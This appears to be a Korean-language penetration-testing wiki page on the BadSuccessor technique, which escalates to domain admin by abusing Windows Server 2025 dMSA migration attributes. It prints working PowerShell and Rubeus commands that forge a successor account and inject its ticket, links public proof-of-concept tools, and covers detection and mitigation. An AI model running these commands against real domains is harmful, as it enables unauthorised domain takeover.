# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse

{{#include ../../banners/hacktricks-training.md}}

## 개요

Delegated Managed Service Accounts (**dMSA**)는 Windows Server 2025에 탑재된 **gMSA**의 차세대 후계자입니다. 합법적인 마이그레이션 워크플로우는 관리자가 *오래된* 계정(사용자, 컴퓨터 또는 서비스 계정)을 dMSA로 교체하면서 권한을 투명하게 유지할 수 있도록 합니다. 이 워크플로우는 `Start-ADServiceAccountMigration` 및 `Complete-ADServiceAccountMigration`과 같은 PowerShell cmdlet을 통해 노출되며, **dMSA 객체**의 두 LDAP 속성에 의존합니다:

* **`msDS-ManagedAccountPrecededByLink`** – *DN 링크*로서 대체된(오래된) 계정.
* **`msDS-DelegatedMSAState`**       – 마이그레이션 상태 (`0` = 없음, `1` = 진행 중, `2` = *완료됨*).

공격자가 OU 내에서 **어떤** dMSA를 생성하고 이 두 속성을 직접 조작할 수 있다면, LSASS 및 KDC는 dMSA를 연결된 계정의 *후계자*로 간주합니다. 이후 공격자가 dMSA로 인증하면 **연결된 계정의 모든 권한을 상속받습니다** – 관리 계정이 연결된 경우 **도메인 관리자**까지 가능합니다.

이 기술은 2025년 Unit 42에 의해 **BadSuccessor**라는 이름이 붙여졌습니다. 작성 시점에 **보안 패치**는 제공되지 않으며, OU 권한의 강화만이 문제를 완화합니다.

### 공격 전제 조건

1. **조직 단위(OU)** 내에서 객체를 생성할 수 있는 *권한이 있는* 계정과 다음 중 하나 이상을 보유해야 합니다:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** 객체 클래스
* `Create Child` → **`All Objects`** (일반 생성)
2. LDAP 및 Kerberos에 대한 네트워크 연결(표준 도메인 가입 시나리오 / 원격 공격).

## 취약한 OU 열거하기

Unit 42는 각 OU의 보안 설명자를 파싱하고 필요한 ACE를 강조하는 PowerShell 도우미 스크립트를 공개했습니다:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
스크립트는 `(objectClass=organizationalUnit)`에 대한 페이지된 LDAP 검색을 실행하고 모든 `nTSecurityDescriptor`를 확인합니다.

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (객체 클래스 *msDS-DelegatedManagedServiceAccount*)

## Exploitation Steps

쓰기 가능한 OU가 식별되면 공격은 단 3개의 LDAP 쓰기 작업만 남습니다:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
복제 후 공격자는 단순히 **logon**하여 `attacker_dMSA$`로 로그인하거나 Kerberos TGT를 요청할 수 있습니다. Windows는 *superseded* 계정의 토큰을 생성합니다.

### 자동화

여러 공개 PoC가 비밀번호 검색 및 티켓 관리를 포함한 전체 워크플로를 래핑합니다:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* NetExec 모듈 – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### 사후 활용
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## 탐지 및 사냥

OU에서 **객체 감사**를 활성화하고 다음 Windows 보안 이벤트를 모니터링합니다:

* **5137** – **dMSA** 객체 생성
* **5136** – **`msDS-ManagedAccountPrecededByLink`** 수정
* **4662** – 특정 속성 변경
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA에 대한 TGT 발급

`4662` (속성 수정), `4741` (컴퓨터/서비스 계정 생성) 및 `4624` (후속 로그온)을 상관관계 분석하면 BadSuccessor 활동이 빠르게 드러납니다. **XSIAM**과 같은 XDR 솔루션은 즉시 사용할 수 있는 쿼리를 제공합니다 (참조를 참조하십시오).

## 완화

* **최소 권한** 원칙을 적용합니다 – 신뢰할 수 있는 역할에만 *서비스 계정* 관리를 위임합니다.
* 명시적으로 필요하지 않은 OU에서 `Create Child` / `msDS-DelegatedManagedServiceAccount`를 제거합니다.
* 위에 나열된 이벤트 ID를 모니터링하고 dMSA를 생성하거나 편집하는 *비티어-0* 신원에 대해 경고합니다.

## 추가 정보

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## 참고 문헌

- [Unit42 – 좋은 계정이 나쁜 계정으로 변할 때: 위임된 관리 서비스 계정 악용](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor 모듈](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
